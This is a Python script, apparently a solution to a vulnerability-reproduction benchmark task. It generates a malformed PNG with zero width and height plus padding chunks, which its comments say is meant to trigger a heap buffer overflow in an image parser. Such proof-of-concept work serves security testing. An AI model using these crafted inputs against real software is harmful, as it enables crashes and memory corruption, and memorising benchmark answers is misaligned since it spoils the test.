import struct
import zlib
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PNG with zero width and height to trigger heap buffer overflow
        # PNG signature
        png_signature = b'\x89PNG\r\n\x1a\n'
        
        # IHDR chunk with zero width and height
        width = 0
        height = 0
        bit_depth = 8
        color_type = 6  # RGBA
        compression = 0
        filter_method = 0
        interlace = 0
        
        ihdr_data = struct.pack('>IIBBBBB', width, height, bit_depth, 
                               color_type, compression, filter_method, interlace)
        ihdr_chunk = self._make_chunk(b'IHDR', ihdr_data)
        
        # Create IDAT chunk with some data that will overflow buffer
        # Since width=0 and height=0, any allocation based on width*height will be 0
        # but we still provide compressed image data
        idat_data = zlib.compress(b'\x00' * 100)  # Some dummy data
        idat_chunk = self._make_chunk(b'IDAT', idat_data)
        
        # IEND chunk
        iend_chunk = self._make_chunk(b'IEND', b'')
        
        # Build PNG with chunks in correct order
        png_data = png_signature + ihdr_chunk + idat_chunk + iend_chunk
        
        # Pad to target length if needed
        target_length = 2936
        if len(png_data) < target_length:
            # Add padding in a comment chunk
            padding_needed = target_length - len(png_data) - 12  # 12 for chunk overhead
            if padding_needed > 0:
                padding_data = b'A' * padding_needed
                text_chunk = self._make_chunk(b'tEXt', b'Comment\x00' + padding_data)
                # Reconstruct with text chunk before IEND
                png_data = png_signature + ihdr_chunk + idat_chunk + text_chunk + iend_chunk
        
        # Ensure exact target length
        if len(png_data) != target_length:
            # Trim or extend IEND if needed
            if len(png_data) > target_length:
                png_data = png_data[:target_length]
            else:
                # Extend with null bytes
                png_data += b'\x00' * (target_length - len(png_data))
        
        return png_data
    
    def _make_chunk(self, chunk_type, chunk_data):
        """Create a PNG chunk with length, type, data, and CRC"""
        length = len(chunk_data)
        chunk = struct.pack('>I', length) + chunk_type + chunk_data
        crc = zlib.crc32(chunk_type + chunk_data) & 0xffffffff
        chunk += struct.pack('>I', crc)
        return chunk